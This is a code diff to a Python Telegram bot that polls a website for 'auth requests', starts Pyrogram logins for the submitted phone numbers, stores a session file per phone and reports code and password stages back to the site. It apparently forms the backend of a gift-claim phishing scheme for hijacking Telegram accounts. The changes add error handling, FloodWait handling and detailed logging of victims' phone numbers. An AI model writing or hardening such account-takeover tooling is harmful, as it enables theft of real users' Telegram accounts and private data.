@@ -494,12 +494,15 @@ async def send_claim_to_api(uid, gift_hash, username):
 async def update_api_status(api_url, rid, status, **kwargs):
     """Update auth request status on website"""
     url = f"{api_url}/api/telegram/update-request"
-    data = {"requestId": rid, "status": status, "processed": True, **kwargs}
+    # Помечаем как processed только финальные статусы (success, error, cancelled)
+    # Промежуточные статусы (waiting_code, waiting_password) остаются необработанными
+    processed = status in ("success", "error", "cancelled")
+    data = {"requestId": rid, "status": status, "processed": processed, **kwargs}
     try:
         async with aiohttp.ClientSession() as s:
             async with s.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 await resp.read()  # Читаем ответ полностью, чтобы закрыть соединение
-                logger.info(f"[API] Status update {status}: {resp.status}")
+                logger.info(f"[API] Status update {status} (processed={processed}): {resp.status}")
     except Exception as e:
         logger.error(f"[API] Status update error: {e}")
 
@@ -1541,7 +1544,7 @@ class UnifiedBot:
         self.api_url = SETTINGS['api_url']
 
     async def process_queue(self):
-        logger.info("Polling API...")
+        logger.info(f"📡 Starting API polling from {self.api_url}/api/telegram/get-pending")
         async with aiohttp.ClientSession() as sess:
             while True:
                 try:
@@ -1551,20 +1554,26 @@ class UnifiedBot:
                             data = await r.json()  # json() уже читает весь ответ
                             requests = data.get('requests', [])
                             if requests:
-                                logger.info(f"Found {len(requests)} pending request(s)")
+                                logger.info(f"📥 Found {len(requests)} pending request(s)")
                             for req in requests:
                                 rid = req.get('requestId')
                                 act = req.get('action')
+                                phone = req.get('phone', 'N/A')
+                                logger.info(f"📋 Request: id={rid}, action={act}, phone={phone}")
                                 # Use requestId + action as key to allow same requestId with different actions
                                 key = f"{rid}_{act}"
                                 if key not in processed_requests:
                                     processed_requests[key] = True
-                                    logger.info(f"Found new request to process: {rid}, action={act}")
+                                    logger.info(f"🔄 Processing new request: {rid}, action={act}, phone={phone}")
                                     asyncio.create_task(self.handle_req(req))
                                 else:
-                                    logger.debug(f"Request already processed: {key}")
+                                    logger.debug(f"⏭️ Request already processed: {key}")
+                        else:
+                            logger.warning(f"⚠️ API returned status {r.status}")
+                except aiohttp.ClientError as e:
+                    logger.error(f"❌ HTTP error during polling: {e}")
                 except Exception as e:
-                    logger.debug(f"Polling error: {e}")
+                    logger.error(f"❌ Polling error: {type(e).__name__}: {e}")
                 await asyncio.sleep(0.5)
 
     async def handle_req(self, req):
@@ -1582,18 +1591,46 @@ class UnifiedBot:
         try:
             if act == 'send_phone':
                 if not phone:
+                    logger.error(f"No phone provided for request {rid}")
+                    await update_api_status(self.api_url, rid, "error", error="No phone provided", phone=phone, telegramId=tg_id)
                     return
-                client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
-                                api_hash=SETTINGS['api_hash'])
-                pyrogram_clients[phone] = client
-                if not client.is_connected:
-                    await client.connect()
-                sent = await client.send_code(phone)
-                user_sessions[phone] = {'h': sent.phone_code_hash}
-                logger.info(f"Code sent to {phone}")
-                await update_api_status(self.api_url, rid, "waiting_code", phone=phone)
-                # Log to Telegram
-                await log_event(f"📱 <b>Code sent</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
+                
+                logger.info(f"📱 Starting send_code for {phone}, requestId={rid}")
+                try:
+                    client = Client(str(SESSIONS_DIR / phone.strip('+')), api_id=SETTINGS['api_id'],
+                                    api_hash=SETTINGS['api_hash'])
+                    pyrogram_clients[phone] = client
+                    
+                    if not client.is_connected:
+                        logger.info(f"🔌 Connecting Pyrogram client for {phone}...")
+                        await client.connect()
+                        logger.info(f"✅ Pyrogram connected for {phone}")
+                    
+                    logger.info(f"📤 Sending code to {phone}...")
+                    sent = await client.send_code(phone)
+                    user_sessions[phone] = {'h': sent.phone_code_hash}
+                    logger.info(f"✅ Code sent to {phone}, hash: {sent.phone_code_hash[:10]}...")
+                    
+                    await update_api_status(self.api_url, rid, "waiting_code", phone=phone, telegramId=tg_id)
+                    # Log to Telegram
+                    await log_event(f"📱 <b>Code sent</b>\n\nPhone: <code>{phone}</code>\nTG ID: <code>{tg_id}</code>")
+                    
+                except FloodWait as e:
+                    error_msg = f"FloodWait: подождите {e.value} секунд"
+                    logger.error(f"❌ {error_msg} for {phone}")
+                    await update_api_status(self.api_url, rid, "error", error=error_msg, phone=phone, telegramId=tg_id)
+                    if client and client.is_connected:
+                        await client.disconnect()
+                        
+                except Exception as e:
+                    error_msg = f"Ошибка отправки кода: {type(e).__name__}: {str(e)}"
+                    logger.error(f"❌ Send code error for {phone}: {error_msg}")
+                    await update_api_status(self.api_url, rid, "error", error=error_msg, phone=phone, telegramId=tg_id)
+                    if client and client.is_connected:
+                        try:
+                            await client.disconnect()
+                        except:
+                            pass
 
             elif act == 'send_code':
                 if not code:
